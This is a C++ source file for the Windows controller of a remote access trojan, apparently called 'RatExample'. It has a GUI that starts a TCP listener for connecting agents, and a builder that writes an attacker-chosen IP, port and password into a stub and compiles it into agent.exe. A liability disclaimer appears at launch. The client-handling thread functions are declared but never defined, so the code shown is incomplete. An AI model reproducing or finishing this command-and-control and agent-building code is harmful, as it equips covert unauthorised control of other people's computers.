#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <thread>
#include <map>
#include <mutex>
#include <windows.h>
#include <winsock2.h>
#include <regex>

#pragma comment(lib, "ws2_32.lib")

#define TCP_PORT 9999
#define UDP_PORT 8888
#define STUB_FILE "stub.cpp"
#define TEMP_AGENT_FILE "temp_agent.cpp"
#define AGENT_EXE "agent.exe"

std::map<std::string, SOCKET> clients;
std::mutex clientsMutex;
SOCKET tcpServerSocket = INVALID_SOCKET;
SOCKET udpServerSocket = INVALID_SOCKET;

DWORD WINAPI TCPClientThread(LPVOID lpParam); 
DWORD WINAPI UDPClientThread(LPVOID lpParam); 

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
void logMessage(const std::string& message, COLORREF color);
void updateClientList();
void handleError(const std::string& message);
void buildAgent(const std::string& agentIp, int agentPort, const std::string& password);
void startTCPServer(std::string ip, int port);
bool validateIP(const std::string& ip);
bool validatePort(int port);
bool validatePassword(const std::string& password);

// Function to show the disclaimer message box
void showDisclaimer() {
    MessageBox(NULL, 
        "Open source edition, might/may be altered/tampered with by third-party authors. The official author is not liable for any damage caused or sustained by this tool and shall not be legally bothered. This may/might be the official version, but you can always check on the RatExample GitHub page.", 
        "Disclaimer", MB_OK | MB_ICONINFORMATION);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    showDisclaimer();

    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_HREDRAW | CS_VREDRAW, WndProc,
        0, 0, hInstance, NULL, LoadCursor(NULL, IDC_ARROW), (HBRUSH)(COLOR_WINDOW + 1),
        NULL, "MainWindow", NULL };

    if (!RegisterClassEx(&wc)) {
        MessageBox(NULL, "Window Registration Failed!", "Error", MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    HWND hwnd = CreateWindowEx(
        WS_EX_CLIENTEDGE, "MainWindow", "Server GUI",
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 640, 480,
        NULL, NULL, hInstance, NULL);

    if (hwnd == NULL) {
        MessageBox(NULL, "Window Creation Failed!", "Error", MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    MSG Msg;
    while (GetMessage(&Msg, NULL, 0, 0) > 0) {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    return Msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND serverIpInput, serverPortInput, agentIpInput, agentPortInput, passwordInput;
    switch (msg) {
        case WM_CREATE: {
            // Create UI elements
            CreateWindow("STATIC", "Server IP:", WS_VISIBLE | WS_CHILD, 10, 10, 80, 25, hwnd, NULL, NULL, NULL);
            serverIpInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 100, 10, 200, 25, hwnd, NULL, NULL, NULL);

            CreateWindow("STATIC", "Server Port:", WS_VISIBLE | WS_CHILD, 10, 40, 80, 25, hwnd, NULL, NULL, NULL);
            serverPortInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 100, 40, 200, 25, hwnd, NULL, NULL, NULL);

            CreateWindow("BUTTON", "Start TCP Server", WS_VISIBLE | WS_CHILD, 10, 70, 140, 25, hwnd, (HMENU)1, NULL, NULL);
            CreateWindow("BUTTON", "Stop TCP Server", WS_VISIBLE | WS_CHILD, 160, 70, 140, 25, hwnd, (HMENU)2, NULL, NULL);

            CreateWindow("STATIC", "Agent IP:", WS_VISIBLE | WS_CHILD, 10, 100, 80, 25, hwnd, NULL, NULL, NULL);
            agentIpInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 100, 100, 200, 25, hwnd, NULL, NULL, NULL);

            CreateWindow("STATIC", "Agent Port:", WS_VISIBLE | WS_CHILD, 10, 130, 80, 25, hwnd, NULL, NULL, NULL);
            agentPortInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 100, 130, 200, 25, hwnd, NULL, NULL, NULL);

            CreateWindow("STATIC", "Password:", WS_VISIBLE | WS_CHILD, 10, 160, 80, 25, hwnd, NULL, NULL, NULL);
            passwordInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD, 100, 160, 200, 25, hwnd, NULL, NULL, NULL);

            CreateWindow("BUTTON", "Build Agent", WS_VISIBLE | WS_CHILD, 10, 190, 140, 25, hwnd, (HMENU)3, NULL, NULL);

            CreateWindow("LISTBOX", "", WS_VISIBLE | WS_CHILD | WS_BORDER | LBS_NOTIFY, 10, 220, 400, 200, hwnd, (HMENU)4, NULL, NULL);
        }
        break;
        case WM_COMMAND: {
            if (LOWORD(wParam) == 1) {
                char ipBuffer[16], portBuffer[6];
                GetWindowText(serverIpInput, ipBuffer, 16);
                GetWindowText(serverPortInput, portBuffer, 6);

                std::string serverIp(ipBuffer);
                int serverPort = std::stoi(portBuffer);

                if (validateIP(serverIp) && validatePort(serverPort)) {
                    std::thread tcpThread(startTCPServer, serverIp, serverPort);
                    tcpThread.detach();
                } else {
                    MessageBox(hwnd, "Invalid server IP or port", "Error", MB_ICONERROR);
                }
            } else if (LOWORD(wParam) == 2) {
                if (tcpServerSocket != INVALID_SOCKET) {
                    closesocket(tcpServerSocket);
                    tcpServerSocket = INVALID_SOCKET;
                    logMessage("TCP Server stopped\n", RGB(255, 0, 0));
                }
            } else if (LOWORD(wParam) == 3) {
                char agentIpBuffer[16], agentPortBuffer[6], passwordBuffer[32];
                GetWindowText(agentIpInput, agentIpBuffer, 16);
                GetWindowText(agentPortInput, agentPortBuffer, 6);
                GetWindowText(passwordInput, passwordBuffer, 32);

                std::string agentIp(agentIpBuffer);
                int agentPort = std::stoi(agentPortBuffer);
                std::string password(passwordBuffer);

                if (validateIP(agentIp) && validatePort(agentPort) && validatePassword(password)) {
                    buildAgent(agentIp, agentPort, password);
                } else {
                    MessageBox(hwnd, "Invalid agent IP, port or password", "Error", MB_ICONERROR);
                }
            }
        }
        break;
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void logMessage(const std::string& message, COLORREF color) {
    std::cout << message << std::endl;
}

void updateClientList() {
    // Stub function to update client list
}

void handleError(const std::string& message) {
    std::cerr << message << std::endl;
}

void startTCPServer(std::string ip, int port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        handleError("Failed to initialize Winsock");
        return;
    }

    tcpServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (tcpServerSocket == INVALID_SOCKET) {
        handleError("Failed to create TCP socket");
        WSACleanup();
        return;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());
    serverAddr.sin_port = htons(port);

    if (bind(tcpServerSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        int error = WSAGetLastError();
        handleError("Failed to bind TCP socket: " + std::to_string(error));
        closesocket(tcpServerSocket);
        WSACleanup();
        return;
    }

    if (listen(tcpServerSocket, SOMAXCONN) == SOCKET_ERROR) {
        int error = WSAGetLastError();
        handleError("Failed to listen on TCP socket: " + std::to_string(error));
        closesocket(tcpServerSocket);
        WSACleanup();
        return;
    }

    logMessage("TCP Server started\n", RGB(0, 255, 0));

    while (tcpServerSocket != INVALID_SOCKET) {
        sockaddr_in clientAddr;
        int clientAddrLen = sizeof(clientAddr);
        SOCKET clientSocket = accept(tcpServerSocket, (sockaddr*)&clientAddr, &clientAddrLen);
        if (clientSocket == INVALID_SOCKET) {
            int error = WSAGetLastError();
            handleError("Failed to accept TCP client connection: " + std::to_string(error));
            continue;
        }

        clientsMutex.lock();
        clients[inet_ntoa(clientAddr.sin_addr)] = clientSocket;
        clientsMutex.unlock();

        updateClientList();
        CreateThread(NULL, 0, TCPClientThread, (LPVOID)clientSocket, 0, NULL);
    }

    WSACleanup();
}

void buildAgent(const std::string& agentIp, int agentPort, const std::string& password) {
    std::ifstream inFile(STUB_FILE);
    std::ofstream outFile(TEMP_AGENT_FILE);

    std::stringstream buffer;
    buffer << inFile.rdbuf();
    std::string stubCode = buffer.str();

    size_t ipPos = stubCode.find("AGENT_IP");
    if (ipPos != std::string::npos) {
        stubCode.replace(ipPos, 8, agentIp);
    }

    size_t portPos = stubCode.find("AGENT_PORT");
    if (portPos != std::string::npos) {
        stubCode.replace(portPos, 10, std::to_string(agentPort));
    }

    size_t passPos = stubCode.find("AGENT_PASSWORD");
    if (passPos != std::string::npos) {
        stubCode.replace(passPos, 14, password);
    }

    outFile << stubCode;
    outFile.close();

    system(("g++ -o " + std::string(AGENT_EXE) + " " + TEMP_AGENT_FILE).c_str());

    logMessage("Agent built successfully", RGB(0, 255, 0));
}

bool validateIP(const std::string& ip) {
    std::regex ipRegex("^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\\."
                       "(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\\."
                       "(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\\."
                       "(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$");
    return std::regex_match(ip, ipRegex);
}

bool validatePort(int port) {
    return port > 0 && port <= 65535;
}

bool validatePassword(const std::string& password) {
    return !password.empty();
}
